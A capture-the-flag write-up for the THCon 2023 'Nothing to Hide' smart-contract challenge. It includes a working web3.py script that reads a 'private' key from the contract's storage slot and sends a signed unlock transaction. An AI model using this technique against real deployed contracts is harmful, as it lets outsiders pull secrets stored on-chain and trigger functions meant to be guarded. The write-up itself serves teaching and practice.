# Nothing to Hide (THCon CTF 2023)


# Description

![](/images/thcon23-nothingtohide-description.png)

The challenge provides the following contract, and, same as the [Welcome challenge](https://cryptax.github.io/2023/04/22/welcome.html), the goal is to "unlock" to get the flag.


```
pragma solidity ^0.7.1;

contract hidden {

    bool public isLocked;
    
    bytes32 private key;
    
    bool private other;

    uint256 private garbage = 88888888888;

    uint256 public useless;

    uint256 private bob;


    constructor() {
        //hidden
    }

    function unlock(bytes32 _something) public {
        require(other);
        if (key == _something) {
            isLocked = false;
        }
    }

}
```


# Solving the challenge

Like in the previous challenge, to unlock, we need a **key**, except this time it is *private*:

```
bytes32 private key;
...
function unlock(bytes32 _something) public {
        require(other);
        if (key == _something) {
            isLocked = false;
        }
    }
```

So, we're going to read the key (exactly the way I had intended to do it initially with Welcome) using [`get_storage_at`](https://web3py.readthedocs.io/en/stable/web3.eth.html#web3.eth.Eth.get_storage_at). The storage probably holds the key at index 1:

```
bool public isLocked; # index 0
bytes32 private key;  # index 1
bool private other;   # index 2
...
```


The first step is to get the ABI of the contract, using solc. That's a step I grasped from [Sylvain Pelissier at Insomni'hack CTF](https://sylvainpelissier.gitlab.io/posts/2023-03-24-insomnihack-ownercheap/):

```
solc nothingtohide.sol --abi > abi.json
```

For the command to work, in my case, I had to fix the solidity pragma to `pragma solidity ^0.8.19;`. Then I copy-pasted the Json array in my Python script.

Then, you deploy the contract on the CTF infrastructure and retrieve the contact's address.

My script is very inspired from Sylvain's:

1. Connect to the RPC URL
2. Get the contract, using its address
3. Read the key from storage
4. Send the transaction

To send the transaction, you need your private key. You can retrieve it from the Metamask wallet you created for the CTF:

![](/images/thcon23-web3-account.png)
![](/images/thcon23-web3-accountdetails.png)

```python
#!/usr/bin/env python3

from web3 import Web3

# solc nothingtohide.sol --abi > abi.json - then copy paste content of abi.json here
abi = [{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"isLocked","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"bytes32","name":"_something","type":"bytes32"}],"name":"unlock","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"useless","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"}]

# connect to the CTF RPC URL
url = 'https://node01-eth.ctf.thcon.party:8545'
web3 = Web3(Web3.HTTPProvider(url))

# I am logged in the CTF interface with this personal address
my_address = web3.to_checksum_address('0xc8fe...')

# The contract is deployed at this address
contract_address = web3.to_checksum_address('0xb9eE2C6DBa64e2dc3FE7e78aEE8e34FBb33FcAA3')
contract = web3.eth.contract(address=contract_address, abi=abi)

# Read the key from the contract
key_bytes = web3.eth.get_storage_at(contract_address,1)
print(f"key bytes: {key_bytes} {len(key_bytes)}")
# b' \xfa\xbb\xc0f0e\xde\x90\x9de\xa3\x02D\xd2\xb4\x1eE\x10\xa3`\xe7\xd5\xb0xA\xbb\x90\x8a\xd5z\x9f'

# create transaction
print('Creating transaction...')
transfer_tx = contract.functions.unlock(key_bytes).build_transaction(
    {
        'from': my_address,
        'nonce': web3.eth.get_transaction_count(my_address),
        'gasPrice': web3.eth.gas_price
    })


# signing the transaction with my personal wallet's private key (in Metamask)
print("Signing transaction...")
x_create = web3.eth.account.sign_transaction(transfer_tx, 0x863ce...)
# sending the transaction - for that I need a few tokens at least that I can mine on the CTF interface
print('Send raw...')
tx_hash = web3.eth.send_raw_transaction(x_create.rawTransaction)
print('Receipt')
tx_receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f'Tx successful with hash: { tx_receipt.transactionHash.hex() }')
```

This unlocks the contract, and thus, when you go back to the CTF interface, you get the flag :)

![](/images/thcon23-nothingtohide-solved.png)

# My feedback

Actually, I flagged this challenge more easily / quickly than Welcome, because I had some prior (small) experience with Web3 python scripts.
Nevertheless, I liked it very much: I find the scenario's design excellent, the CTF crypto interface excellent. Thanks!

